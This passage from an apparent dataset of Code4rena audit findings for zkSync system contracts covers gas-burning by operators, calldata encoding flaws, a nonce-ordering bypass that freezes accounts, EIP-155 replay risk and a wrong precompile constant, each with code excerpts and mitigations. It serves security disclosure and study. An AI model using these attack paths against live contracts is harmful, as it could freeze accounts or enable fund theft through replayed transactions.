([link1](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L61), [link2](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L62)), the check on the `encodedData` length ([link](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L63-L66)), etc.\n\nSuch possibility of forcing the overall `bootloader::ZKSYNC_NEAR_CALL_markFactoryDepsL2` to [near call revert](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1573-L1579), makes the operator able to burn all the gas of the L2 transaction if there is at least one bytecode to be published at the start of transaction processing.\n\n### Impact\n\nThe ability of the operator to burn all the gas of the L2 transaction in the call of the `bootloader::ZKSYNC_NEAR_CALL_markFactoryDepsL2` function, if at least one bytecode is to be published.\n\n### Recommended Mitigation Steps\n\nUse `revertWithReason` instead of `nearCallPanic` for the cases of unsuccessful calls of the `Compressor::publishCompressedBytecode` function. The cases of `out of gas error` on such calls operator can process as standard bytecode publications through the `bootloader::markFactoryDepsForTx` functionality.\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/805#issuecomment-1795728505):**\n > This has medium severity because it gives the operator the ability to forcefully fail the transaction.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/805#issuecomment-1829782380):**\n > The finding is similar to [#71](https://github.com/code-423n4/2023-10-zksync-findings/issues/71); however, in this case it shows how the Operator can break trust expectations by purposefully making tx fails via OOG.\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the `bootloader::sendCompressedBytecode` function of the zkSync system contracts. The function uses `nearCallPanic()` for the case of an unsuccessful call of the `Compressor::publishCompressedBytecode` function. This can happen if the operator provides invalid data, ignoring internal checks. This allows the operator to burn all the gas of the L2 transaction, if there is at least one bytecode to be published. To mitigate this issue, it is recommended to use `revertWithReason` instead of `nearCallPanic` for unsuccessful calls of the `Compressor::publishCompressedBytecode` function. This vulnerability is considered medium severity as it allows the operator to forcefully fail the transaction. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/805",
      "tags": [],
      "finders": [
        "Audittens"
      ]
    },
    {
      "id": "30286",
      "title": "[M-07] Wrong encoding of the data in the `sendCompressedBytecode` function",
      "impact": "MEDIUM",
      "content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1244-L1245><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1255-L1259><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1365><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1542><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/scripts/process.ts#L123><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L54-L82>\n\n### Description\n\nThere is enforcement in the `bootloader::sendCompressedBytecode` function that the data to be used for the call of the `Compressor::publishCompressedBytecode` function is encoded in a standard way.\n\nBut this check contains bugs:\n1. There is no check that the `originalBytecodeOffset` is equal to `afterSelectorPtr + 64`. This leads to the possibility of passing a great number of unused bytes as calldata of the call of the `Compressor::publishCompressedBytecode` function. In this case, the calldata will have the following format:\n\n```\n4                               bytes : `publishCompressedBytecode` selector\n32                              bytes : offset for `_bytecode` parameter                                                  = V\n32                              bytes : offset for `_rawCompressedData` parameter                                         = V + 32 + rounded_len(_bytecode)\n(V - 64)                        bytes : any bytes that will be ignored in the `publishCompressedBytecode` function\n32                              bytes : length of `_bytecode` parameter                                                   = len(_bytecode)\nrounded_len(_bytecode)          bytes : `_bytecode` parameter                                                             = _bytecode \n32                              bytes : length of `_rawCompressedData` parameter                                          = len(_rawCompressedData)\nrounded_len(_rawCompressedData) bytes : `_rawCompressedData` parameter                                                    = _rawCompressedData\n```\n\n2. There are used unsafe \"raw\" arithmetic operations in the calculations of the offsets, while the `safe` analogs should be used. This leads to the possibility of passing absolutely wrong data so the call of the `Compressor::publishCompressedBytecode` function will revert. As this bug does not provide any strong attack vector, I will present only the idea of how to achieve this, not the whole calldata. The offset of the `_bytecode` parameter should be equal `(2**256) - 64` (so the `originalBytecodeOffset` will pass the `checkOffset` check), rest of the parameters is easy to determine over this. The same happens in the `bootloader::validateBytes` function, as in the `bootloader::lengthRoundedByWords` function the overflow happens, leading to the same outcome.\n\n### Impact\n\nThe ability of the operator to pass up to `~COMPRESSED_BYTECODES_SLOTS * 32 = ~1048576` additional bytes into the call of the `Compressor::publishCompressedBytecode` function. Such possibility of spending **part of the transaction gas limit** makes the operator able to actually decrease the L2 transaction gas limit, which leads to the possibility of manipulation of the amount of gas used for the transaction execution.\n\nThe ability of the operator to pass encoding-related checks of the `bootloader::sendCompressedBytecode` function, which leads to the possibility of forcing the `Compressor::publishCompressedBytecode` function call to revert.\n\n### Recommended Mitigation Steps\n\n1. You can add the following check into the `bootloader::sendCompressedBytecode` function:\n\n```solidity\nif iszero(eq(add(afterSelectorPtr, 64), originalBytecodeOffset)) {\n    assertionError(\"Compression calldata incorrect\")\n}\n```\n\n2. You can use `safeAdd` instead of `add` in the corresponding calculations in the `bootloader::sendCompressedBytecode` function.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/807#issuecomment-1845074348):**\n > The Warden has demonstrated how unsafe arithmetic could be used by the operator to pass incorrect data that \"checks\" down to the expected values. This could be used to pass incorrect compressed data as well as abuse gas costs as means to cause end users to be overcharged.\n\n**[vladbochok (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/807#issuecomment-1845074348)**\n\n***\n\n",
      "summary": "\nThis bug report discusses a potential issue with the `bootloader::sendCompressedBytecode` function in the code for zkSync. This function is meant to ensure that the data used for the `Compressor::publishCompressedBytecode` function is encoded correctly. However, there are two bugs in the code that could allow the operator to manipulate the amount of gas used for a transaction and potentially cause it to fail. The report recommends adding a check to the `bootloader::sendCompressedBytecode` function and using a safer arithmetic operation to mitigate these issues. The team at zkSync has confirmed the bug and is working on a fix. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/807",
      "tags": [],
      "finders": [
        "Audittens"
      ]
    },
    {
      "id": "30285",
      "title": "[M-06] Nonce ordering of EOA can be updated to \"arbitrary\" through an L1 tx",
      "impact": "MEDIUM",
      "content": "\nNonce order of an EOA should always be sequential, otherwise the transaction cannot be validated. The default account does not allow user to call function `updateNonceOrdering` of ContractDeployer. However, the restriction can be bypassed if user call `updateNonceOrdering` through an L1 priority transaction. As a result, the user's account will be permanently frozen.\n\n### Proof of Concept\n\n    function _validateTransaction(\n        bytes32 _suggestedSignedHash,\n        Transaction calldata _transaction\n    ) internal returns (bytes4 magic) {\n        // Note, that nonce holder can only be called with \"isSystem\" flag.\n        SystemContractsCaller.systemCallWithPropagatedRevert(\n            uint32(gasleft()),\n            address(NONCE_HOLDER_SYSTEM_CONTRACT),\n            0,\n            abi.encodeCall(INonceHolder.incrementMinNonceIfEquals, (_transaction.nonce))\n        );\n\n    function incrementMinNonceIfEquals(uint256 _expectedNonce) external onlySystemCall {\n        uint256 addressAsKey = uint256(uint160(msg.sender));\n        uint256 oldRawNonce = rawNonces[addressAsKey];\n\n        (, uint256 oldMinNonce) = _splitRawNonce(oldRawNonce);\n        require(oldMinNonce == _expectedNonce, \"Incorrect nonce\");\n\n        unchecked {\n            rawNonces[addressAsKey] = oldRawNonce + 1;\n        }\n    }\n\n`incrementMinNonceIfEquals` is used in `_validateTransaction`. It always uses a sequential nonce.\n\n            // Checks whether the nonce `nonce` have been already used for \n            // account `from`. Reverts if the nonce has not been used properly.\n            function ensureNonceUsage(from, nonce, shouldNonceBeUsed) {\n                // INonceHolder.validateNonceUsage selector\n                mstore(0, {{RIGHT_PADDED_VALIDATE_NONCE_USAGE_SELECTOR}})\n                mstore(4, from)\n                mstore(36, nonce)\n                mstore(68, shouldNonceBeUsed)\n\n                let success := call(\n                    gas(),\n                    NONCE_HOLDER_ADDR(),\n                    0,\n                    0,\n                    100,\n                    0,\n                    0\n                )\n\n                if iszero(success) {\n                    revertWithReason(\n                        ACCOUNT_TX_VALIDATION_ERR_CODE(),\n                        1\n                    )\n                }\n            }\n\n    function validateNonceUsage(address _address, uint256 _key, bool _shouldBeUsed) external view {\n        bool isUsed = isNonceUsed(_address, _key);\n\n        if (isUsed && !_shouldBeUsed) {\n            revert(\"Reusing the same nonce twice\");\n        } else if (!isUsed && _shouldBeUsed) {\n            revert(\"The nonce was not set as used\");\n        }\n    }\n\n    function isNonceUsed(address _address, uint256 _nonce) public view returns (bool) {\n        uint256 addressAsKey = uint256(uint160(_address));\n        return (_nonce < getMinNonce(_address) || nonceValues[addressAsKey][_nonce] > 0);\n    }\n\nThe bootloader calls `validateNonceUsage` too, which considers the arbitrary ordering.\n\nWe need to prevent default account from changing nonce ordering type; otherwise, these two methods will conflict. If user's current `minNonce` is 13, nonce of new tx also needs to be 13, but if some value is already stored under 14, `isNonceUsed` will return true. Which means the user will no longer be able to initiate new transactions.\n\n    function _execute(Transaction calldata _transaction) internal {\n        address to = address(uint160(_transaction.to));\n        uint128 value = Utils.safeCastToU128(_transaction.value);\n        bytes calldata data = _transaction.data;\n        uint32 gas = Utils.safeCastToU32(gasleft());\n\n        // Note, that the deployment method from the deployer contract can only be called with a \"systemCall\" flag.\n        bool isSystemCall;\n        if (to == address(DEPLOYER_SYSTEM_CONTRACT) && data.length >= 4) {\n            bytes4 selector = bytes4(data[:4]);\n            // Check that called function is the deployment method,\n            // the others deployer method is not supposed to be called from the default account.\n            isSystemCall =\n                selector == DEPLOYER_SYSTEM_CONTRACT.create.selector ||\n                selector == DEPLOYER_SYSTEM_CONTRACT.create2.selector ||\n                selector == DEPLOYER_SYSTEM_CONTRACT.createAccount.selector ||\n                selector == DEPLOYER_SYSTEM_CONTRACT.create2Account.selector;\n        }\n\nFlag `isSystemCall` is only set true when calling deployment method of ContractDeployer, so if user tries to call function `updateNonceOrdering` of ContractDeployer, `isSystemCall` will be false and the call will fail.\n\n            function msgValueSimulatorMimicCall(to, from, value, dataPtr) -> success {\n                // Only calls to the deployer system contract are allowed to be system\n                let isSystem := eq(to, CONTRACT_DEPLOYER_ADDR())\n\n                success := mimicCallOnlyResult(\n                    MSG_VALUE_SIMULATOR_ADDR(),\n                    from, \n                    dataPtr,\n                    0,\n                    1,\n                    value,\n                    to,\n                    isSystem\n                )\n            }\n\nHowever, if the transaction is initiated on L1, selector is not checked. Flag `isSystem` is set true as long as the target is ContractDeployer. The transaction to `updateNonceOrdering` will succeed.\n\n    function updateNonceOrdering(AccountNonceOrdering _nonceOrdering) external onlySystemCall {\n        AccountInfo memory currentInfo = accountInfo[msg.sender];\n\n        require(\n            _nonceOrdering == AccountNonceOrdering.Arbitrary &&\n                currentInfo.nonceOrdering == AccountNonceOrdering.Sequential,\n            \"It is only possible to change from sequential to arbitrary ordering\"\n        );\n\n        currentInfo.nonceOrdering = _nonceOrdering;\n        _storeAccountInfo(msg.sender, currentInfo);\n\n        emit AccountNonceOrderingUpdated(msg.sender, _nonceOrdering);\n    }\n\nOnce updated, the change is permanent. The account can no longer initiate any new transactions.\n\n### Recommended Mitigation Steps\n\nDon't allow EOA to call `updateNonceOrdering`. Do the check on L1 side.\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed, but disagreed with severity](https://github.com/code-423n4/2023-10-zksync-findings/issues/861#issuecomment-1833352913)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/861#issuecomment-1887432458):**\n > A dispute regarding usage of future code was made, which is rational. Personally, I believe that being able to access the `isSystem` flag could be precursor to higher impact findings and that for this reason the finding warrants medium severity.\n> \n> I understand that as of now, the system is safe; however, this broken invariant could be a root cause for drastic issues in the future if zkSync Era functionality is further expanded.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/861).*\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the nonce order of an EOA (Externally Owned Account) in the zkSync system. The default account does not allow users to call a certain function, but this restriction can be bypassed by using a different type of transaction. This can result in the user's account being permanently frozen. The report includes a proof of concept and recommended mitigation steps to prevent this issue from occurring. The severity of the bug is debated among the team members, but it is agreed that it could potentially lead to more serious problems in the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/861",
      "tags": [],
      "finders": [
        "xuwinnie"
      ]
    },
    {
      "id": "30284",
      "title": "[M-05] EIP-155 is not enforced, allowing attackers/malicious operators to profit from replaying transactions",
      "impact": "MEDIUM",
      "content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/libraries/TransactionHelper.sol#L183-L187><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/DefaultAccount.sol#L78-L107>\n\n### Vulnerability details\n\nThe L2 `DefaultAccount.validateTransaction` function and transaction encoding process in the bootloader do not enforce EIP-155. If the `reserved[0]`  of the legacy tx is zero, the EIP-155 will be disabled. The chainId will not be included in the transaction signature.\n\n```solidity\n        bytes memory encodedChainId;\n        if (_transaction.reserved[0] != 0) {\n            encodedChainId = bytes.concat(RLPEncoder.encodeUint256(block.chainid), hex\"80_80\");\n        }\n```\n\n### Impact\n\nThere are two potential exploitation scenarios:\n1. A malicious attacker can replay transactions from the mainnet or other networks not protected by EIP-155. While there are very few EVM networks currently supporting transactions without EIP-155, attackers still have an opportunity to profit by replaying early transactions from other networks. For example, if an early ETH user A sent a legacy tx to user B before EIP-155 enabled, and now user A deposited some ETH into the zkSync era network, then user B could replay the early transaction from user A to steal his funds on the zkSync network.\n2. Operators can replay early user transactions from eth/other EVM networks to collect gas fees or even profit directly.\n\n### Proof of Concept\n\nEIP-155 will be disabled when the following two conditions are met:\n1. Transaction type is legacy tx, which `tx_type=0`.\n2. `tx.reserved[0] == 0`.\n\nThe value of the reserved field cannot be set arbitrarily, but if the user inputs a transaction with `tx_type=0` and the `v` in the signature is 27 or 28, then `reserved[0]` will be set to `0`.\n\nCode [here](https://github.com/matter-labs/zksync-era/blob/6cb8c2c350385ed96c0824869a885a7285735a91/core/lib/vm/src/types/internals/transaction_data.rs#L52-L60).\n\n```rust\n                let should_check_chain_id = if matches!(\n                    common_data.transaction_type,\n                    TransactionType::LegacyTransaction\n                ) && common_data.extract_chain_id().is_some()\n                {\n                    U256([1, 0, 0, 0])\n                } else {\n                    U256::zero()\n                };\n```\n\n```rust\n    pub fn extract_chain_id(&self) -> Option<u64> {\n        let bytes = self.input_data()?;\n        let chain_id = match bytes.first() {\n            Some(x) if *x >= 0x80 => {\n                let rlp = Rlp::new(bytes);\n                let v = rlp.val_at(6).ok()?;\n                PackedEthSignature::unpack_v(v).ok()?.1?\n            }\n```\n\n### Recommended Mitigation Steps\n\nEnforce EIP-155 signature verification in the contract `DefaultAccount.validateTransaction`.\n\n**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/882#issuecomment-1794660244):**\n > This is a design decision. So, QA.\n\n**[Alex the Entreprenerd (judge) decreased severity to QA and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/882#issuecomment-1824841175):**\n > This is an option, not the default.\n\n**[Alex the Entreprenerd (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/882#issuecomment-1887439561):**\n > I have spent time investigating this issues impact and why this is considered \"acceptable\". I believe that a clear divide between Developers and Security Researchers can be seen in how the severity is interpreted for this issue.\n>\n> Any \"EVM Developer\" will look at this finding as trivial, and obvious, \"it's the user fault\" for having a wallet that is pre EIP-155 and the usage of this signature scheme are keyless deployments. Any security researcher will look at this as a means to DOS users, and potentially steal their funds.\n> \n> I have spoken with a lot of different actors in the security space and have heard every possible severity for this type of findings, from known to high severity.\n> \n> After talking with 4 different judges, am going to set the finding as Medium severity. As zkSync is not uniquely subjected to this finding, I believe the finding to be a danger to end users which should be publicly disclosed to them.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/882).*\n\n***\n\n",
      "summary": "\nThe bug report discusses a vulnerability in the L2 `DefaultAccount.validateTransaction` function and transaction encoding process in the bootloader of the zkSync network. The issue is that the system does not enforce EIP-155, which includes the chainId in the transaction signature. This means that if the `reserved[0]` of a legacy transaction is set to zero, the EIP-155 will be disabled and the chainId will not be included in the signature. This could potentially allow malicious attackers to replay transactions from other networks and steal funds from users on the zkSync network. The report recommends enforcing EIP-155 signature verification in the `DefaultAccount.validateTransaction` contract to mitigate this issue. The severity of this vulnerability was initially debated, but it was eventually classified as a Medium severity issue due to its potential impact on end users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/882",
      "tags": [],
      "finders": [
        "ustas",
        "OffsideLabs",
        "anon"
      ]
    },
    {
      "id": "30283",
      "title": "[M-04] Incorrect max precompile address",
      "impact": "MEDIUM",
      "content": "\nTwo new precompiles have been introduced (`ECADD` and `ECMUL`) without updating the pointer that indicates the current maximum precompile address (`CURRENT_MAX_PRECOMPILE_ADDRESS`), causing these new precompiles to not be considered as precompiles in the system.\n\n### Impact\n\nThe updated revision of ZkSync Era has introduced two new precompiles, `ECADD` and `ECMUL` at addresses `0x06` and `0x07`, respectively.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Constants.sol#L27-L28>\n\n```solidity\n27: address constant ECADD_SYSTEM_CONTRACT = address(0x06);\n28: address constant ECMUL_SYSTEM_CONTRACT = address(0x07);\n```\n\nTheir implementation is available in `code/system-contracts/contracts/precompiles/EcAdd.yul` and `code/system-contracts/contracts/precompiles/EcMul.yul`.\n\nPrecompile addresses are tracked by a constant named `CURRENT_MAX_PRECOMPILE_ADDRESS`, which points to the maximum address that is a precompile. The intention here is to have a way to determine if an address is a precompile, i.e. `precompile <=> address <= CURRENT_MAX_PRECOMPILE_ADDRESS`.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Constants.sol#L35>\n\n```solidity\n35: uint256 constant CURRENT_MAX_PRECOMPILE_ADDRESS = uint256(uint160(SHA256_SYSTEM_CONTRACT));\n```\n\nNote that the implementation still points to the old maximum precompile, which was `SHA256` at address `0x02`. This means that both `ECADD` and `ECMUL` won't be considered as precompiles, this is because their address are greater than the `CURRENT_MAX_PRECOMPILE_ADDRESS`, breaking the invariant.\n\nParticularly, this impacts the `getCodeHash()` function in `AccountCodeStorage`. The function follows the assumption that a precompile is under the `CURRENT_MAX_PRECOMPILE_ADDRESS` constant in order to return the hash of the empty string (`EMPTY_STRING_KECCAK`).\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/AccountCodeStorage.sol#L89-L95>\n\n```solidity\n89:     function getCodeHash(uint256 _input) external view override returns (bytes32) {\n90:         // We consider the account bytecode hash of the last 20 bytes of the input, because\n91:         // according to the spec \"If EXTCODEHASH of A is X, then EXTCODEHASH of A + 2**160 is X\".\n92:         address account = address(uint160(_input));\n93:         if (uint160(account) <= CURRENT_MAX_PRECOMPILE_ADDRESS) {\n94:             return EMPTY_STRING_KECCAK;\n95:         }\n...\n```\n\nAs both `ECADD` and `ECMUL` are greater than `CURRENT_MAX_PRECOMPILE_ADDRESS`, the implementation of `getCodeHash()` will return zero instead of the expected `EMPTY_STRING_KECCAK` constant, as other precompiles do.\n\n### Proof of Concept\n\nThe following test asks the `AccountCodeStorage` contract for the code hash of the new precompiles. The expected value should be the keccak hash of the empty string.\n\n```typescript\ndescribe('AccountCodeStorage', function() {\n    it('fails to return correct hash for ECADD precompile', async () => {\n        expect(await accountCodeStorage.getCodeHash('0x0000000000000000000000000000000000000006')).to.be.eq(\n            EMPTY_STRING_KECCAK\n        );\n    });\n    \n    it('fails to return correct hash for ECMUL precompile', async () => {\n        expect(await accountCodeStorage.getCodeHash('0x0000000000000000000000000000000000000007')).to.be.eq(\n            EMPTY_STRING_KECCAK\n        );\n    });\n});\n```\n\nThe expected results from these tests fail:\n\n      Audit tests\n        AccountCodeStorage\n          1) fails to return correct hash for ECADD precompile\n          2) fails to return correct hash for ECMUL precompile\n\n\n      0 passing (256ms)\n      2 failing\n\n      1) Audit tests\n           AccountCodeStorage\n             fails to return correct hash for ECADD precompile:\n\n          AssertionError: expected '0x00000000000000000000000000000000000…' to equal '0xc5d2460186f7233c927e7db2dcc703c0e50…'\n          + expected - actual\n\n          -0x0000000000000000000000000000000000000000000000000000000000000000\n          +0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\n\n          at Context.<anonymous> (test/Audit.spec.ts:33:110)\n          at processTicksAndRejections (node:internal/process/task_queues:96:5)\n\n      2) Audit tests\n           AccountCodeStorage\n             fails to return correct hash for ECMUL precompile:\n\n          AssertionError: expected '0x00000000000000000000000000000000000…' to equal '0xc5d2460186f7233c927e7db2dcc703c0e50…'\n          + expected - actual\n\n          -0x0000000000000000000000000000000000000000000000000000000000000000\n          +0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\n\n          at Context.<anonymous> (test/Audit.spec.ts:39:110)\n          at processTicksAndRejections (node:internal/process/task_queues:96:5)\n\n### Recommendation\n\nUpdate the `CURRENT_MAX_PRECOMPILE_ADDRESS` pointer to include the new precompile addresses.\n\n```diff\n-    uint256 constant CURRENT_MAX_PRECOMPILE_ADDRESS = uint256(uint160(SHA256_SYSTEM_CONTRACT));\n+    uint256 constant CURRENT_MAX_PRECOMPILE_ADDRESS = uint256(uint160(ECMUL_SYSTEM_CONTRACT));\n```\n\n**[miladpiri (zkSync) confirmed and commented via duplicate issue #142](https://github.com/code-423n4/2023-10-zksync-findings/issues/142#issuecomment-1794953393):**\n> Valid finding. Medium is fair.\n\n***\n\n",
      "summary": "\nSummary: The updated version of ZkSync introduced two new precompiles, but the system was not updated to recognize them as precompiles. This caused issues with the `getCodeHash()` function in `AccountCodeStorage` and resulted in incorrect values being returned. The recommendation is to update the system to include the new precompile addresses. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/888",
      "tags": [],
      "finders": [
        "quarkslab",
        "Jeiwan",
        "0xTheC0der",
        "gumgumzum",
        "Audittens",
        "lsaudit",
        "0xstochasticparrot",
        "anon",
        "leviticus1129",
        "zero-idea",
        "rvierdiiev",
        "0x1337",
        "erebus"
      ]
    },
    {
      "id": "30282",
      "title": "[M-03] Loss of funds for the sender when ``L1->L2`` TX fails in the bootloader on L2",
      "impact": "MEDIUM",
      "content": "\n### Sending ``L1->L2`` TX\n\nIn zksync, `requestL2Transaction`  can be used to send a ``L1->L2`` TX.\n\n```solidity\n    function requestL2Transaction(\n        address _contractL2,\n        uint256 _l2Value,\n        bytes calldata _calldata,\n        uint256 _l2GasLimit,\n        uint256 _l2GasPerPubdataByteLimit,\n        bytes[] calldata _factoryDeps,\n        address _refundRecipient\n    ) external payable nonReentrant senderCanCallFunction(s.allowList) returns (bytes32 canonicalTxHash) {\n```\n\n[Mailbox.requestL2Transaction:L236-L245](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L236-L245)\n\nAn important param is `_l2TxGasLimit`, which is used to process the TX on L2. The L2 gas limit should include both the overhead for processing the batch and the L2 gas needed to process the transaction itself (i.e. the actual `l2GasLimit` that will be used for the transaction).\n\nSo, `_l2TxGasLimit` should have an amount that's enough to cover:\n\n1.  Transaction overhead.\n2.  The transaction itself (body execution).\n\nTo ensure this, there is a validation enforced on `requestL2Transaction` before pushing the TX to the `priorityQueue`.\n\n```solidity\n\tL2CanonicalTransaction memory transaction = _serializeL2Transaction(_priorityOpParams, _calldata, _factoryDeps);\n\n\tbytes memory transactionEncoding = abi.encode(transaction);\n\n\tTransactionValidator.validateL1ToL2Transaction(transaction, transactionEncoding, s.priorityTxMaxGasLimit);\n```\n\n[Mailbox.\\_writePriorityOp:L361-L368](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L361-L368)\n\nThis is to make sure the transaction at least get a chance to be executed.\n\n### Bootloader ``L1->L2`` TX execuation flow\n\nWhen the bootloader receives the ``L1->L2`` TX, it does the following:\n\n1. Calculates the L2 gas limit for the transaction's body, i.e. without intrinsic costs and overhead.\n\n```solidity\n\tlet gasLimitForTx, reservedGas := getGasLimitForTx(\n\t\tinnerTxDataOffset, \n\t\ttransactionIndex, \n\t\tgasPerPubdata, \n\t\tL1_TX_INTRINSIC_L2_GAS(), \n\t\tL1_TX_INTRINSIC_PUBDATA()\n\t)\n```\n\n[bootloader:L878-L884](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L878-L884)\n\n**gasLimitForTx** - is the gas limit for the transaction's body.<br>\n**reservedGas** - is the amount of gas that is beyond the operator's trust limit to refund it back later.\n\nNote: the operator's trust limit is guaranteed to be at least `MAX_GAS_PER_TRANSACTION` which is at the moment `80000000` (check `SystemConfig.json`).\n\n2. Ensure that the deposited eth covers `txInternalCost` and `value`.\n\n```solidity\n\tlet gasPrice := getMaxFeePerGas(innerTxDataOffset)\n\tlet txInternalCost := safeMul(gasPrice, gasLimit, \"poa\")\n\tlet value := getValue(innerTxDataOffset)\n\tif lt(getReserved0(innerTxDataOffset), safeAdd(value, txInternalCost, \"ol\")) {\n\t\tassertionError(\"deposited eth too low\")\n\t}\n```\n\n[bootloader:L901-L906](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L901-L906)\n\n3.  Checks if **gasLimitForTx** is greater than `gasUsedOnPreparation` and then calls `getExecuteL1TxAndGetRefund` to attempt to execute the TX. This function returns a `potentialRefund` if there is any.\n\n```solidity\n\t\tif gt(gasLimitForTx, gasUsedOnPreparation) {\n\t\t\tlet potentialRefund := 0\n\n\t\t\tpotentialRefund, success := getExecuteL1TxAndGetRefund(txDataOffset, sub(gasLimitForTx, gasUsedOnPreparation))\n\n```\n\n[bootloader:L908-L912](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L908-L912)\n\nFor example, let's say the sender has `10_000_000` gas limit (after deducting the overhead ..etc.), and the TX execution consumed `3_000_000`, then the `potentialRefund` is supposed to be `10_000_000-3_000_000 = 7_000_000`. This will be returned to `refundRecipient`. However, if the actual TX execution fails, then `potentialRefund` will always be zero. Therefore, no refund for the sender at all. In other words, let's say that the TX execution consumed only `500_000` only till it reverted (for whatever reason). so, the `potentialRefund` should be `9_500_000` which is not the case since it will be always zero on failure.\n\nNote: obviously this is not applicable if ``L1->L2`` transactions were set to be free. [Check the comments here](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L927-L931).\n\n### Reason & Explanation\n\nThis issue occurs due to the fact that near call opcode is used to execute the TX (to avoid 63/64 rule), and when the TX execution fails, near call panic is utilised to avoid reverting the bootloader and to revert minting ether to the user.\n\n```solidity\n\tlet gasBeforeExecution := gas() \n\tsuccess := ZKSYNC_NEAR_CALL_executeL1Tx(\n\t\tcallAbi,\n\t\ttxDataOffset\n\t)\n```\n\n[bootloader:L980-L988](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L980-L988)\n\n```solidity\n\t// 